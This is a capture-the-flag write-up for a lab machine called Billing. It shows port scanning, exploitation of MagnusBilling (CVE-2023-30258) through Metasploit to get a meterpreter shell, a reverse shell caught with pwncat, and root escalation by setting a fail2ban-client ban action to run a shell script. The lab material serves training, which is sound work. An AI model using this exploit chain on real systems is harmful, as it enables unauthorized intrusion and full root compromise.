# Box Name

## Billing

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# NMAP
```js
└─$ rustscan -r 1-65535 -a 10.10.226.241 --ulimit 5000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
: Modified By Kn1ght                   :
________________________________________
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.226.241:22
Open 10.10.226.241:80
Open 10.10.226.241:3306
Open 10.10.226.241:5038
[~] Starting Script(s)

PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCukT/TLi8Po4V6OZVI6yhgSlTaANGLErWG2Hqz9UOxX3XXMFvRe0uivnYlcvBwvSe09IcHjC6qczRgRjdqQOxF2XHUIFBgPjNOR3mb1kfWg5jKAGun6+J9atS8z+5d6CZuv0YWH6jGJTQ1YS9vGNuFvE3coJKSBYtNbpJgBApX67tCQ4YKenrG/AQddi3zZz3mMHN6QldivMC+NCFp+PozjjoJgD4WULCElDwW4IgWjq64bL3Y/+Ii/PnPfLufZwaJNy67TjKv1KKzW0ag2UxqgTjc85feWAxvdWKVoX5FIhCrYwi6Q23BpTDqLSXoJ3irVCdVAqHfyqR72emcEgoWaxseXn2R68SptxxrUcpoMYUXtO1/0MZszBJ5tv3FBfY3NmCeGNwA98JXnJEb+3A1FU/LLN+Ah/Rl40NhrYGRqJcvz/UPreE73G/wjY8LAUnvamR/ybAPDkO+OP47OjPnQwwbmAW6g6BInnx9Ls5XBwULmn0ubMPi6dNWtQDZ0/U=
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBVI/7v4DHnwY/FkhLBQ71076mt5xG/9agRtb+vldezX9vOC2UgKnU6N+ySrhLEx2snCFNJGG0dukytLDxxKIcw=
|   256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII6ogE6DWtLYKAJo+wx+orTODOdYM23iJgDGE2l79ZBN
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.10.226.241/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    syn-ack ttl 63 MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6

```

## HTTP(80)

![](Pasted%20image%2020250309182123.png)

 -  find a login form for magnusbilling
 - find a metasploit module for magnusbilling


```js
msf6 > search magnusbilling

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.
   1    \_ target: PHP                                            .                .          .      .
   2    \_ target: Unix Command                                   .                .          .      .
   3    \_ target: Linux Dropper                                  .                .          .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'

```

## Initial Foothold
---

```js
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > options 

Module options (exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,ty
                                         pe:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metas
                                         ploit.com/docs/using-metasploit/basics/usi
                                         ng-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default
                                         is randomly generated)
   TARGETURI  /mbilling        yes       The MagnusBilling endpoint URL
   URIPATH                     no        The URI to use for this exploit (default i
                                         s random)
   VHOST                       no        HTTP server virtual host

   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to liste
                                       n on. This must be an address on the local m
                                       achine or 0.0.0.0 to listen on all addresses
   SRVPORT  8080             yes       The local port to listen on.
   When TARGET is 0:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   WEBSHELL                   no        The name of the webshell with extension. We
                                        bshell name will be randomly generated if l
                                        eft unset.

Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specif
                                     ied)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Linux Dropper
```

- in metasploit
	- set lhost and rhosts  
	- run
	- get meterpreter shell as asterisk
	- get user.txt
```js
	meterpreter > cd /home
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040755/rwxr-xr-x  4096  dir   2024-09-09 09:45:14 -0500  magnus

meterpreter > cd magnus
meterpreter > ls
Listing: /home/magnus
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-03-09 18:34:40 -0500  .bash_history
100600/rw-------  220   fil   2024-03-27 14:45:39 -0500  .bash_logout
100600/rw-------  3526  fil   2024-03-27 14:45:39 -0500  .bashrc
040700/rwx------  4096  dir   2024-09-09 07:01:09 -0500  .cache
040700/rwx------  4096  dir   2024-03-27 14:47:04 -0500  .config
040700/rwx------  4096  dir   2024-09-09 07:01:09 -0500  .gnupg
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  .local
100700/rwx------  807   fil   2024-03-27 14:45:39 -0500  .profile
040700/rwx------  4096  dir   2024-03-27 14:46:17 -0500  .ssh
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Desktop
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Documents
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Downloads
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Music
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Pictures
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Public
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Templates
040700/rwx------  4096  dir   2024-03-27 14:46:12 -0500  Videos
100644/rw-r--r--  38    fil   2024-03-27 16:44:18 -0500  user.txt

```


## Privilege Escalation
----
# upgrade to a better shell
- used meterpreter to upload a simple bash shell to /dev/shm
- 
```js
meterpreter > cd /dev/shm
meterpreter > upload shell.sh
[*] Uploading  : /home/scott/THM/Billing/shell.sh -> shell.sh
[*] Uploaded -1.00 B of 55.00 B (-1.82%): /home/scott/THM/Billing/shell.sh -> shell.sh
[*] Completed  : /home/scott/THM/Billing/shell.sh -> shell.sh
meterpreter > chmod 755 shell.sh
meterpreter > ls
Listing: /dev/shm
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  55    fil   2025-03-09 18:42:56 -0500  shell.sh
meterpreter > execute -f ./shell.sh
```
		
```js
└─$ pwncat-cs -lp 1234
[18:42:55] Welcome to pwncat 🐈!                                                             __main__.py:160
[18:42:59] received connection from 10.10.226.241:37278                                           bind.py:82
[18:43:03] 10.10.226.241:37278: registered new host w/ db                                     manager.py:953
(local) pwncat$                                                                                             
(remote) asterisk@Billing:/dev/shm$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

- ## sudo -l
```js
(remote) asterisk@Billing:/dev/shm$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

- ## enumerating /usr/bin/fail2ban-client
```js
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client
Usage: fail2ban-client [OPTIONS] <COMMAND>

Fail2Ban v0.11.2 reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

Options:
    -c, --conf <DIR>        configuration directory
    -s, --socket <FILE>     socket path
    -p, --pidfile <FILE>    pidfile path
    --pname <NAME>          name of the process (main thread) to identify instance (default fail2ban-server)
    --loglevel <LEVEL>      logging level
    --logtarget <TARGET>    logging target, use file-name or stdout, stderr, syslog or sysout.
    --syslogsocket auto|<FILE>
    -d                      dump configuration. For debugging
    --dp, --dump-pretty     dump the configuration using more human readable representation
    -t, --test              test configuration (can be also specified with start parameters)
    -i                      interactive mode
    -v                      increase verbosity
    -q                      decrease verbosity
    -x                      force execution of the server (remove socket file)
    -b                      start server in background (default)
    -f                      start server in foreground
    --async                 start server in async mode (for internal usage only, don't read configuration)
    --timeout               timeout to wait for the server (for internal usage only, don't read configuration)
    --str2sec <STRING>      convert time abbreviation format to seconds
    -h, --help              display this help message
    -V, --version           print the version (-V returns machine-readable short format)

Command:
                                             BASIC
    start                                    starts the server and the jails
    restart                                  restarts the server
    restart [--unban] [--if-exists] <JAIL>   restarts the jail <JAIL> (alias
                                             for 'reload --restart ... <JAIL>')
    reload [--restart] [--unban] [--all]     reloads the configuration without
                                             restarting of the server, the
                                             option '--restart' activates
                                             completely restarting of affected
                                             jails, thereby can unban IP
                                             addresses (if option '--unban'
                                             specified)
    reload [--restart] [--unban] [--if-exists] <JAIL>
                                             reloads the jail <JAIL>, or
                                             restarts it (if option '--restart'
                                             specified)
    stop                                     stops all jails and terminate the
                                             server
    unban --all                              unbans all IP addresses (in all
                                             jails and database)
    unban <IP> ... <IP>                      unbans <IP> (in all jails and
                                             database)
    banned                                   return jails with banned IPs as
                                             dictionary
    banned <IP> ... <IP>]                    return list(s) of jails where
                                             given IP(s) are banned
    status                                   gets the current status of the
                                             server
    ping                                     tests if the server is alive
    echo                                     for internal usage, returns back
                                             and outputs a given string
    help                                     return this output
    version                                  return the server version

                                             LOGGING
    set loglevel <LEVEL>                     sets logging level to <LEVEL>.
                                             Levels: CRITICAL, ERROR, WARNING,
                                             NOTICE, INFO, DEBUG, TRACEDEBUG,
                                             HEAVYDEBUG or corresponding
                                             numeric value (50-5)
    get loglevel                             gets the logging level
    set logtarget <TARGET>                   sets logging target to <TARGET>.
                                             Can be STDOUT, STDERR, SYSLOG or a
                                             file
    get logtarget                            gets logging target
    set syslogsocket auto|<SOCKET>           sets the syslog socket path to
                                             auto or <SOCKET>. Only used if
                                             logtarget is SYSLOG
    get syslogsocket                         gets syslog socket path
    flushlogs                                flushes the logtarget if a file
                                             and reopens it. For log rotation.

                                             DATABASE
    set dbfile <FILE>                        set the location of fail2ban
                                             persistent datastore. Set to
                                             "None" to disable
    get dbfile                               get the location of fail2ban
                                             persistent datastore
    set dbmaxmatches <INT>                   sets the max number of matches
                                             stored in database per ticket
    get dbmaxmatches                         gets the max number of matches
                                             stored in database per ticket
    set dbpurgeage <SECONDS>                 sets the max age in <SECONDS> that
                                             history of bans will be kept
    get dbpurgeage                           gets the max age in seconds that
                                             history of bans will be kept

                                             JAIL CONTROL
    add <JAIL> <BACKEND>                     creates <JAIL> using <BACKEND>
    start <JAIL>                             starts the jail <JAIL>
    stop <JAIL>                              stops the jail <JAIL>. The jail is
                                             removed
    status <JAIL> [FLAVOR]                   gets the current status of <JAIL>,
                                             with optional flavor or extended
                                             info

                                             JAIL CONFIGURATION
    set <JAIL> idle on|off                   sets the idle state of <JAIL>
    set <JAIL> ignoreself true|false         allows the ignoring of own IP
                                             addresses
    set <JAIL> addignoreip <IP>              adds <IP> to the ignore list of
                                             <JAIL>
    set <JAIL> delignoreip <IP>              removes <IP> from the ignore list
                                             of <JAIL>
    set <JAIL> ignorecommand <VALUE>         sets ignorecommand of <JAIL>
    set <JAIL> ignorecache <VALUE>           sets ignorecache of <JAIL>
    set <JAIL> addlogpath <FILE> ['tail']    adds <FILE> to the monitoring list
                                             of <JAIL>, optionally starting at
                                             the 'tail' of the file (default
                                             'head').
    set <JAIL> dellogpath <FILE>             removes <FILE> from the monitoring
                                             list of <JAIL>
    set <JAIL> logencoding <ENCODING>        sets the <ENCODING> of the log
                                             files for <JAIL>
    set <JAIL> addjournalmatch <MATCH>       adds <MATCH> to the journal filter
                                             of <JAIL>
    set <JAIL> deljournalmatch <MATCH>       removes <MATCH> from the journal
                                             filter of <JAIL>
    set <JAIL> addfailregex <REGEX>          adds the regular expression
                                             <REGEX> which must match failures
                                             for <JAIL>
    set <JAIL> delfailregex <INDEX>          removes the regular expression at
                                             <INDEX> for failregex
    set <JAIL> addignoreregex <REGEX>        adds the regular expression
                                             <REGEX> which should match pattern
                                             to exclude for <JAIL>
    set <JAIL> delignoreregex <INDEX>        removes the regular expression at
                                             <INDEX> for ignoreregex
    set <JAIL> findtime <TIME>               sets the number of seconds <TIME>
                                             for which the filter will look
                                             back for <JAIL>
    set <JAIL> bantime <TIME>                sets the number of seconds <TIME>
                                             a host will be banned for <JAIL>
    set <JAIL> datepattern <PATTERN>         sets the <PATTERN> used to match
                                             date/times for <JAIL>
    set <JAIL> usedns <VALUE>                sets the usedns mode for <JAIL>
    set <JAIL> attempt <IP> [<failure1> ... <failureN>]
                                             manually notify about <IP> failure
    set <JAIL> banip <IP> ... <IP>           manually Ban <IP> for <JAIL>
    set <JAIL> unbanip [--report-absent] <IP> ... <IP>
                                             manually Unban <IP> in <JAIL>
    set <JAIL> maxretry <RETRY>              sets the number of failures
                                             <RETRY> before banning the host
                                             for <JAIL>
    set <JAIL> maxmatches <INT>              sets the max number of matches
                                             stored in memory per ticket in
                                             <JAIL>
    set <JAIL> maxlines <LINES>              sets the number of <LINES> to
                                             buffer for regex search for <JAIL>
    set <JAIL> addaction <ACT>[ <PYTHONFILE> <JSONKWARGS>]
                                             adds a new action named <ACT> for
                                             <JAIL>. Optionally for a Python
                                             based action, a <PYTHONFILE> and
                                             <JSONKWARGS> can be specified,
                                             else will be a Command Action
    set <JAIL> delaction <ACT>               removes the action <ACT> from
                                             <JAIL>

                                             COMMAND ACTION CONFIGURATION
    set <JAIL> action <ACT> actionstart <CMD>
                                             sets the start command <CMD> of
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> actionstop <CMD> sets the stop command <CMD> of the
                                             action <ACT> for <JAIL>
    set <JAIL> action <ACT> actioncheck <CMD>
                                             sets the check command <CMD> of
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> actionban <CMD>  sets the ban command <CMD> of the
                                             action <ACT> for <JAIL>
    set <JAIL> action <ACT> actionunban <CMD>
                                             sets the unban command <CMD> of
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> timeout <TIMEOUT>
                                             sets <TIMEOUT> as the command
                                             timeout in seconds for the action
                                             <ACT> for <JAIL>

                                             GENERAL ACTION CONFIGURATION
    set <JAIL> action <ACT> <PROPERTY> <VALUE>
                                             sets the <VALUE> of <PROPERTY> for
                                             the action <ACT> for <JAIL>
    set <JAIL> action <ACT> <METHOD>[ <JSONKWARGS>]
                                             calls the <METHOD> with
                                             <JSONKWARGS> for the action <ACT>
                                             for <JAIL>

                                             JAIL INFORMATION
    get <JAIL> banned                        return banned IPs of <JAIL>
    get <JAIL> banned <IP> ... <IP>]         return 1 if IP is banned in <JAIL>
                                             otherwise 0, or a list of 1/0 for
                                             multiple IPs
    get <JAIL> logpath                       gets the list of the monitored
                                             files for <JAIL>
    get <JAIL> logencoding                   gets the encoding of the log files
                                             for <JAIL>
    get <JAIL> journalmatch                  gets the journal filter match for
                                             <JAIL>
    get <JAIL> ignoreself                    gets the current value of the
                                             ignoring the own IP addresses
    get <JAIL> ignoreip                      gets the list of ignored IP
                                             addresses for <JAIL>
    get <JAIL> ignorecommand                 gets ignorecommand of <JAIL>
    get <JAIL> failregex                     gets the list of regular
                                             expressions which matches the
                                             failures for <JAIL>
    get <JAIL> ignoreregex                   gets the list of regular
                                             expressions which matches patterns
                                             to ignore for <JAIL>
    get <JAIL> findtime                      gets the time for which the filter
                                             will look back for failures for
                                             <JAIL>
    get <JAIL> bantime                       gets the time a host is banned for
                                             <JAIL>
    get <JAIL> datepattern                   gets the patern used to match
                                             date/times for <JAIL>
    get <JAIL> usedns                        gets the usedns setting for <JAIL>
    get <JAIL> banip [<SEP>|--with-time]     gets the list of of banned IP
                                             addresses for <JAIL>. Optionally
                                             the separator character ('<SEP>',
                                             default is space) or the option '
                                             --with-time' (printing the times
                                             of ban) may be specified. The IPs
                                             are ordered by end of ban.
    get <JAIL> maxretry                      gets the number of failures
                                             allowed for <JAIL>
    get <JAIL> maxmatches                    gets the max number of matches
                                             stored in memory per ticket in
                                             <JAIL>
    get <JAIL> maxlines                      gets the number of lines to buffer
                                             for <JAIL>
    get <JAIL> actions                       gets a list of actions for <JAIL>

                                             COMMAND ACTION INFORMATION
    get <JAIL> action <ACT> actionstart      gets the start command for the
                                             action <ACT> for <JAIL>
    get <JAIL> action <ACT> actionstop       gets the stop command for the
                                             action <ACT> for <JAIL>
    get <JAIL> action <ACT> actioncheck      gets the check command for the
                                             action <ACT> for <JAIL>
    get <JAIL> action <ACT> actionban        gets the ban command for the
                                             action <ACT> for <JAIL>
    get <JAIL> action <ACT> actionunban      gets the unban command for the
                                             action <ACT> for <JAIL>
    get <JAIL> action <ACT> timeout          gets the command timeout in
                                             seconds for the action <ACT> for
                                             <JAIL>

                                             GENERAL ACTION INFORMATION
    get <JAIL> actionproperties <ACT>        gets a list of properties for the
                                             action <ACT> for <JAIL>
    get <JAIL> actionmethods <ACT>           gets a list of methods for the
                                             action <ACT> for <JAIL>
    get <JAIL> action <ACT> <PROPERTY>       gets the value of <PROPERTY> for
                                             the action <ACT> for <JAIL>

Report bugs to https://github.com/fail2ban/fail2ban/issues

```

- looks like a wrapper for fail2ban 
- lets check out some of the commands
```js
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client status
Status
|- Number of jail:	8
`- Jail list:	ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

```js
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client status sshd       
Status for the jail: sshd
|- Filter
|  |- Currently failed:	0
|  |- Total failed:	0
|  `- File list:	/var/log/auth.log
`- Actions
   |- Currently banned:	0
   |- Total banned:	0
   `- Banned IP list:	
```

```js
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client get sshd actions
The jail sshd has the following actions:
iptables-multiport
```

- lets reuse the shell.sh and see if i can get a root shell

```js
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client -i    
Fail2Ban v0.11.2 reads log file that contains password failure report
and bans the corresponding IP addresses using firewall rules.

fail2ban> get sshd iptables-multiport 
2025-03-09 15:00:17,769 fail2ban                [2755]: ERROR   NOK: ('Invalid command (no get action or not yet implemented)',)
Invalid command (no get action or not yet implemented)
fail2ban> get sshd action iptables-multiport 
2025-03-09 15:00:32,448 fail2ban                [2755]: ERROR   NOK: ('list index out of range',)
Sorry but the command is invalid
fail2ban> get sshd actionproperties iptables-multiport 
The jail sshd action iptables-multiport has the following properties:
ESCAPE_CRE, ESCAPE_VN_CRE, actionban, actioncheck, actionflush, actionreban, actionreload, actionrepair, actionstart, actionstop, actionunban, actname, banEpoch, blocktype, blocktype?family=inet6, chain, iptables, iptables?family=inet6, lockingopt, name, port, protocol, returntype, timeout
fail2ban> 
```



```js
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "bash /dev/shm/shell.sh"
bash /dev/shm/shell.sh
(remote) asterisk@Billing:/dev/shm$ sudo -u root /usr/bin/fail2ban-client set sshd banip 10.10.11.1
```

```js
└─$ pwncat-cs -lp 1234
[18:55:10] Welcome to pwncat 🐈!                                                             __main__.py:160
[18:56:01] received connection from 10.10.226.241:57488                                           bind.py:82
[18:56:05] 10.10.226.241:57488: registered new host w/ db                                     manager.py:953
(local) pwncat$                                                                                             
(remote) root@Billing:/# id
uid=0(root) gid=0(root) groups=0(root)
(remote) root@Billing:/# 
```

- noticed my root shell kept disconnecting so i increased the timeout

```js
fail2ban> get sshd action iptables-multiport timeout
60
fail2ban> set sshd action iptables-multiport timeout 48000
48000
fail2ban> 
```


### cat root.txt

